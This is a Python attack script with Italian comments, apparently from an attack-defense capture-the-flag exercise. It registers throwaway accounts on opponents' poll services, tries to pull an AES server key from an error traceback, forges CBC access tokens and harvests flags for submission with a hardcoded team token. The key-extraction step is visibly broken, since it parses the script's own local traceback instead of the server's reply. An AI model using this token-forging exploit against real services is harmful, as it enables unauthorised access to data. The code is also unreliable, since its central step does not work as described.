'''

L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a sondaggi tramite l'utilizzo di un token.
La logica di attacco è la stessa di quella adoperata in exploit_key.py, con l'unica differenza che qui la server_key, utile
per la generazione di un token valido, viene recuperata dinamicamente dal traceback.

'''


import requests
import json
import random
import string
import re
from Crypto.Cipher import AES
import traceback




# Specifico il mio indirizzo IP e quello del dispositivo NOP, che saranno poi esclusi dall'attacco
my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = {"X-Team-Token": "9b8fec624b7ea21a"}
# Ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Otteniamo i dati degli avversari
opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
# Prelevo le informazioni riguardo il servizio che mi interessa
opponents = opponents['Polls']
opponents.pop(my_ip)
opponents.pop(nop_ip)



def create_token(poll_id, server_key):
    # Creo un oggetto cifrario sfruttando la conoscenza della server_key e la modalità CBC
    cipher = AES.new(server_key, AES.MODE_CBC)
    # Dopo aver convertito l'id da stringa a bytes e aver effettuato il padding aggiungendo spazi 
    # finchè non si arriva a 16 byte, possiamo cifrare il messaggio
    token = cipher.encrypt(poll_id.encode().ljust(16))
    # L'IV deve essere concatenato al messaggio cifrato; si aggiunge l'IV perche sarà necessario per decifrare il messaggio
    token = cipher.iv + token

    return token




def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print(requests.put(url, headers = header, json = payload).text)




def exploit():
    for ip, poll_ids in opponents.items():
        try:
        # Registrazione e login come nuovo utente
            username_length = random.randint(5, 64)
            password_length = random.randint(5, 64)
            data = {
                "username": ''.join(random.choices(string.ascii_letters + string.digits, k = username_length)),
                "password": ''.join(random.choices(string.ascii_letters + string.digits, k  =password_length))
            }

            s = requests.Session()
            # Registrazione dell'utente
            s.post(f"http://{ip}:5000/register", data = data)
            # Login dell'utente
            s.post(f"http://{ip}:5000/login", data = data)

            # Tentativo di accesso con un token invalido
            response = s.post(f"http://{ip}:5000/access_poll", data = {"token": "AAAAAAAAA"})

            # Se otteniamo un errore, analizziamo il traceback per trovare la server_key che utilizzeremo poi che generare
            # un token valido
            if "Token invalido, riprovare." in response.text:
                print(f"Errore con token invalido per {ip}, ora cerco la server_key nel traceback...")

                # Estrazione della chiave dal traceback
                for line in traceback.format_exc().splitlines():
                    if 'server_key=' in line:
                        server_key = line.split('server_key=')[1].strip()
                        print(f"Server Key trovata: {server_key}")
                        break

        
            payload = []
            for poll_id in poll_ids:
                token = create_token(poll_id, server_key)
                response = s.post(f"http://{ip}:5000/access_poll", data = {"token": token.hex()})
                if "Token invalido, riprovare." in response.text:
                        print(f"Errore: Token non valido per il sondaggio {poll_id}")
                        continue

                # Raccogliamo le flag
                flags = flag_regex.findall(response.text)
                payload.extend(flags)
                # Invia le flag raccolte
                submit_flags(payload)

        except Exception as e:
            print(f"Errore durante l'exploit per {ip}: {str(e)}")


